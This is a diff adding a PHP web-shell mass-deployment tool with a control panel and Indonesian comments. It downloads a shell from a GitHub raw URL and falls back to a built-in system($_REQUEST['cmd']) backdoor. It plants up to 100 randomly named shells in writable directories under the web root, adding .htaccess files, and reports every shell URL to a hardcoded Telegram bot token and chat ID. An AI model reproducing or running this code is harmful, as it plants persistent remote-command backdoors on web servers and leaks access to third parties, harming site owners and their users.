@@ -1,0 +1,454 @@
+<?php
+set_time_limit(0);
+ignore_user_abort(true);
+error_reporting(0);
+
+$WEBROOT = $_SERVER['DOCUMENT_ROOT'];
+$SHELL_URL = "https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/dev";
+$HTACCESS_URL = "https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/.htaccess";
+
+$BOT_TOKEN = "7589099682:AAF3aa8VlnmSc7PQNmi3dPwusQVDPNdsRGg";
+$CHAT_ID = "6437884821";
+
+function sendTelegram($token, $chat_id, $message) {
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $params = [
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'parse_mode' => 'HTML'
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    
+    return $result;
+}
+
+function downloadContent($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    
+    $content = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if($httpCode == 200 && !empty($content)) {
+        return $content;
+    }
+    
+    return '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; } ?>';
+}
+
+function generateRandomName() {
+    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    
+    for ($i = 0; $i < 6; $i++) {
+        $randomString .= $characters[rand(0, strlen($characters) - 1)];
+    }
+    
+    return $randomString . '.php';
+}
+
+function deployToDirectory($directory, $shell, $htaccess) {
+    if(!is_dir($directory) || !is_writable($directory)) {
+        return false;
+    }
+    
+    $shellFile = $directory . '/' . generateRandomName();
+    
+    $attempts = 0;
+    while (file_exists($shellFile) && $attempts < 3) {
+        $shellFile = $directory . '/' . generateRandomName();
+        $attempts++;
+    }
+    
+    if(@file_put_contents($shellFile, $shell)) {
+        @chmod($shellFile, 0644);
+        
+        $htaccessFile = $directory . '/.htaccess';
+        if(!file_exists($htaccessFile) && is_writable($directory)) {
+            @file_put_contents($htaccessFile, $htaccess);
+            @chmod($htaccessFile, 0644);
+        }
+        
+        return [
+            'path' => $shellFile,
+            'url' => getURLFromPath($shellFile),
+            'filename' => basename($shellFile),
+            'directory' => basename($directory)
+        ];
+    }
+    
+    return false;
+}
+
+function getURLFromPath($fullPath) {
+    $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
+    $fullPath = rtrim($fullPath, '/');
+    
+    $relativePath = str_replace($docRoot, '', $fullPath);
+    $baseURL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . 
+               '://' . $_SERVER['HTTP_HOST'];
+    
+    return $baseURL . $relativePath;
+}
+
+function scanWritableDirectories($baseDir, $limit = 100) {
+    $writableDirs = [];
+    
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST,
+            RecursiveIteratorIterator::CATCH_GET_CHILD
+        );
+        
+        foreach($iterator as $item) {
+            if(count($writableDirs) >= $limit) break;
+            
+            if($item->isDir() && $item->isWritable()) {
+                $writableDirs[] = $item->getPathname();
+            }
+        }
+    } catch(Exception $e) {
+        // Silent fail
+    }
+    
+    if(empty($writableDirs)) {
+        $writableDirs[] = $baseDir;
+    }
+    
+    shuffle($writableDirs);
+    return $writableDirs;
+}
+
+function executeMassDeployment($root, $shellContent, $htaccessContent, $count = 30) {
+    global $BOT_TOKEN, $CHAT_ID;
+    
+    $results = [
+        'success' => [],
+        'failed' => 0,
+        'total_deployed' => 0
+    ];
+    
+    $targetDirectories = scanWritableDirectories($root, 50);
+    
+    foreach($targetDirectories as $dir) {
+        if(count($results['success']) >= $count) break;
+        
+        $deployment = deployToDirectory($dir, $shellContent, $htaccessContent);
+        if($deployment) {
+            $results['success'][] = $deployment;
+            $results['total_deployed']++;
+            
+            // KIRIM NOTIFIKASI TELEGRAM
+            $message = "✅ <b>SHELL BERHASIL DIUPLOAD</b>\n";
+            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
+            $message .= "📁 <b>Directory:</b> " . $deployment['directory'] . "\n";
+            $message .= "📄 <b>Filename:</b> " . $deployment['filename'] . "\n";
+            $message .= "🔗 <b>URL:</b> " . $deployment['url'] . "\n";
+            $message .= "🕐 <b>Time:</b> " . date('H:i:s') . "\n";
+            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
+            $message .= "#" . $results['total_deployed'];
+            
+            sendTelegram($BOT_TOKEN, $CHAT_ID, $message);
+            usleep(500000); // Delay 0.5 detik antar notifikasi
+            
+        } else {
+            $results['failed']++;
+        }
+    }
+    
+    // KIRIM SUMMARY KE TELEGRAM
+    if($results['total_deployed'] > 0) {
+        $summary = "📊 <b>DEPLOYMENT SUMMARY</b>\n";
+        $summary .= "━━━━━━━━━━━━━━━━━━━━\n";
+        $summary .= "✅ <b>Success:</b> " . $results['total_deployed'] . " shells\n";
+        $summary .= "❌ <b>Failed:</b> " . $results['failed'] . " directories\n";
+        $summary .= "🕐 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
+        $summary .= "━━━━━━━━━━━━━━━━━━━━\n";
+        $summary .= "🌐 <i>GitHub Source Deployment</i>";
+        
+        sendTelegram($BOT_TOKEN, $CHAT_ID, $summary);
+    }
+    
+    return $results;
+}
+
+// EXECUTION HANDLER
+if(isset($_GET['action']) && $_GET['action'] == 'deploy') {
+    header('Content-Type: text/html; charset=utf-8');
+    
+    // Download fresh content setiap deployment
+    $freshShellContent = downloadContent($SHELL_URL);
+    $freshHtaccessContent = downloadContent($HTACCESS_URL);
+    
+    $deployCount = isset($_GET['count']) ? intval($_GET['count']) : 30;
+    if($deployCount > 100) $deployCount = 100;
+    
+    // Kirim notifikasi mulai deployment
+    $startMsg = "🚀 <b>MULAI DEPLOYMENT</b>\n";
+    $startMsg .= "━━━━━━━━━━━━━━━━━━━━\n";
+    $startMsg .= "🎯 <b>Target:</b> " . $deployCount . " shells\n";
+    $startMsg .= "📂 <b>Server:</b> " . $_SERVER['HTTP_HOST'] . "\n";
+    $startMsg .= "🕐 <b>Start Time:</b> " . date('H:i:s') . "\n";
+    $startMsg .= "━━━━━━━━━━━━━━━━━━━━";
+    
+    sendTelegram($BOT_TOKEN, $CHAT_ID, $startMsg);
+    
+    $results = executeMassDeployment($WEBROOT, $freshShellContent, $freshHtaccessContent, $deployCount);
+    
+    echo '<!DOCTYPE html>
+    <html>
+    <head>
+        <title>Deployment Results</title>
+        <style>
+            body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
+            .success { color: #00ff00; }
+            .url { color: #00aaff; text-decoration: none; }
+            .url:hover { color: #00ffff; text-decoration: underline; }
+            .stats { border: 1px solid #00ff00; padding: 15px; margin: 20px 0; }
+            .shell-item { margin: 10px 0; padding: 10px; background: #1a1a1a; }
+            .source-info { background: #1a2a1a; padding: 10px; margin: 10px 0; border-left: 3px solid #00ff00; }
+            .telegram-notif { background: #1a2a3a; padding: 10px; margin: 10px 0; border-left: 3px solid #0088ff; }
+        </style>
+    </head>
+    <body>
+    <h1>⚡ REMOTE SOURCE DEPLOYMENT</h1>
+    
+    <div class="telegram-notif">
+        <strong>📱 TELEGRAM NOTIFICATIONS:</strong><br>
+        Notifikasi telah dikirim ke Telegram<br>
+        Total notifikasi: ' . $results['total_deployed'] . ' shells<br>
+        Status: ✅ Selesai
+    </div>
+    
+    <div class="stats">
+        <strong>DEPLOYMENT STATISTICS:</strong><br>
+        ✅ Success: ' . $results['total_deployed'] . ' shells deployed<br>
+        ❌ Failed: ' . $results['failed'] . ' directories<br>
+        📁 Total Targets: ' . count($results['success']) . '<br>
+        🕐 Time: ' . date('H:i:s') . '
+    </div>';
+    
+    if(!empty($results['success'])) {
+        echo '<h2>🔗 DEPLOYED SHELL LINKS:</h2>';
+        echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #333; padding: 10px;">';
+        
+        foreach($results['success'] as $index => $shell) {
+            echo '<div class="shell-item">';
+            echo '<strong>SHELL #' . ($index + 1) . '</strong><br>';
+            echo '📁 Directory: ' . htmlspecialchars($shell['directory']) . '<br>';
+            echo '📄 Filename: <span style="color:#ff9900">' . htmlspecialchars($shell['filename']) . '</span><br>';
+            echo '🔗 <a class="url" href="' . htmlspecialchars($shell['url']) . '" target="_blank">';
+            echo 'Access Shell';
+            echo '</a>';
+            echo '</div>';
+        }
+        
+        echo '</div>';
+    }
+    
+    echo '<br><br>
+    <form method="get">
+        <input type="hidden" name="action" value="deploy">
+        Deploy More: 
+        <select name="count">
+            <option value="10">10 Shells</option>
+            <option value="20">20 Shells</option>
+            <option value="30" selected>30 Shells</option>
+            <option value="50">50 Shells</option>
+        </select>
+        <button type="submit">🚀 DEPLOY AGAIN</button>
+    </form>
+    
+    <br>
+    <a href="?" style="color: #ffaa00;">← BACK TO CONTROL PANEL</a>
+    
+    </body>
+    </html>';
+    exit();
+}
+
+// DEFAULT CONTROL PANEL
+echo '<!DOCTYPE html>
+<html>
+<head>
+    <title>Remote Deployer</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #00ff00;
+            font-family: "Courier New", monospace;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(10, 20, 10, 0.9);
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .header {
+            background: rgba(0, 30, 0, 0.8);
+            padding: 30px;
+            text-align: center;
+            border-bottom: 2px solid #00ff00;
+        }
+        .header h1 {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 10px;
+        }
+        .content {
+            padding: 30px;
+        }
+        .deploy-box {
+            background: rgba(20, 40, 20, 0.7);
+            border: 1px solid #00aa00;
+            border-radius: 8px;
+            padding: 25px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .deploy-box h2 {
+            color: #00ff88;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+        .telegram-box {
+            background: rgba(20, 40, 60, 0.7);
+            border: 1px solid #0088ff;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .telegram-box h3 {
+            color: #00aaff;
+            margin-bottom: 10px;
+        }
+        .count-selector {
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 5px;
+        }
+        select, button {
+            padding: 12px 24px;
+            font-size: 16px;
+            font-family: inherit;
+            border: none;
+            border-radius: 5px;
+            margin: 0 5px;
+        }
+        select {
+            background: #111;
+            color: #00ff00;
+            border: 1px solid #00aa00;
+        }
+        .deploy-btn {
+            background: linear-gradient(135deg, #00aa00 0%, #00ff00 100%);
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 5px;
+        }
+        .deploy-btn:hover {
+            background: linear-gradient(135deg, #00ff00 0%, #00aa00 100%);
+            box-shadow: 0 0 20px #00ff00;
+            transform: translateY(-2px);
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #008800;
+            font-size: 0.9em;
+            border-top: 1px solid #003300;
+            margin-top: 30px;
+        }
+        .status {
+            display: inline-block;
+            padding: 5px 15px;
+            background: #00aa00;
+            color: #000;
+            border-radius: 3px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🌐 REMOTE DEPLOYER + TELEGRAM</h1>
+            <p>GitHub Source + Telegram Notifications</p>
+            <div style="margin-top: 15px;">
+                Status: <span class="status">TELEGRAM ACTIVE</span>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="telegram-box">
+                <h3>📱 TELEGRAM NOTIFICATIONS</h3>
+                <strong>Mode:</strong> Real-time notifications<br>
+                <strong>Format:</strong> Per-shell reporting<br>
+                <strong>Info Included:</strong> Directory, Filename, URL<br>
+                <strong>Status:</strong> Ready to send notifications
+            </div>
+            
+            <div class="deploy-box">
+                <h2>🚀 REMOTE DEPLOYMENT CONTROL</h2>
+                <p style="margin-bottom: 20px; color: #00ccff;">
+                    Deploy shells with Telegram notifications
+                </p>
+                
+                <div class="count-selector">
+                    <strong>Select Deployment Quantity:</strong><br><br>
+                    <form method="get" action="">
+                        <input type="hidden" name="action" value="deploy">
+                        <select name="count">
+                            <option value="5">5 Shells</option>
+                            <option value="10">10 Shells</option>
+                            <option value="20">20 Shells</option>
+                            <option value="30" selected>30 Shells</option>
+                            <option value="50">50 Shells</option>
+                        </select>
+                        <button type="submit" class="deploy-btn">
+                            ⚡ DEPLOY + TELEGRAM
+                        </button>
+                    </form>
+                </div>
+                
+                <p style="color: #ffaa00; margin-top: 20px; font-size: 0.9em;">
+                    ⚠️ Each shell will send a Telegram notification
+                </p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            Remote Deployer v6.0 | Telegram Integration | GitHub Source
+        </div>
+    </div>
+</body>
+</html>';
+?>
